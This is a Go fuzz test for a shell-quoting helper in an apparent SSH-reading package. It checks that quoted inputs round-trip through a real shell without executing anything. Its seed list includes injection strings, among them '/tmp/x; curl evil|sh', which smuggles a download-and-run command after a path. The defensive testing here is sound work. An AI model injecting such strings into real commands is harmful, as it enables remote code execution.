package sshread

import (
	"bytes"
	"errors"
	"os/exec"
	"strings"
	"testing"
)

// FuzzShQuote is the load-bearing check on the quoting layer: for any input,
// splicing shQuote(s) into BOTH variable-assignment shapes the production
// command uses — the absolute form p=<token> and the home-relative form
// p="${HOME:?}"/<token> — and echoing it back through a real sh must
// reproduce the expected bytes with exit 0. Any quoting escape would corrupt
// the bytes or make the shell execute something. Inputs containing NUL are
// skipped: \x00 cannot survive execve arguments (not a shQuote defect;
// config validation independently rejects all control characters).
func FuzzShQuote(f *testing.F) {
	seeds := []string{
		"'",
		`'\''`,
		`\`,
		"$()",
		"`",
		"\n",
		"\u009b", // C1 CSI — acts like ESC [ in some terminals
		"/etc/ssh/authorized_keys.d/deploy",
		"~/my keys/auth",
		"/tmp/x; curl evil|sh",
	}
	for _, s := range seeds {
		f.Add(s)
	}
	f.Fuzz(func(t *testing.T, s string) {
		if strings.ContainsRune(s, 0) {
			t.Skip("NUL cannot survive execve; rejected by config validation")
		}
		shapes := []struct {
			name   string
			script string
			env    []string
			want   []byte
		}{
			{"absolute", "p=" + shQuote(s) + `; printf %s "$p"`, nil, []byte(s)},
			// The tilde shape splices the token after "${HOME:?}"/ — POSIX
			// token adjacency must keep the rest inert regardless of content.
			{"home-relative", `p="${HOME:?}"/` + shQuote(s) + `; printf %s "$p"`,
				[]string{"HOME=/h"}, append([]byte("/h/"), s...)},
		}
		for _, sh := range shapes {
			cmd := exec.CommandContext(t.Context(), "sh", "-c", sh.script)
			cmd.Env = sh.env
			var stderr bytes.Buffer
			cmd.Stderr = &stderr
			out, err := cmd.Output()
			if err != nil {
				var exitErr *exec.ExitError
				if errors.As(err, &exitErr) {
					t.Fatalf("%s: sh exited %d on shQuote(%q): stderr %q", sh.name, exitErr.ExitCode(), s, stderr.String())
				}
				t.Fatalf("%s: run sh on shQuote(%q): %v", sh.name, s, err)
			}
			if !bytes.Equal(out, sh.want) {
				t.Fatalf("%s: round-trip mismatch: shQuote(%q) came back as %q, want %q", sh.name, s, out, sh.want)
			}
		}
	})
}
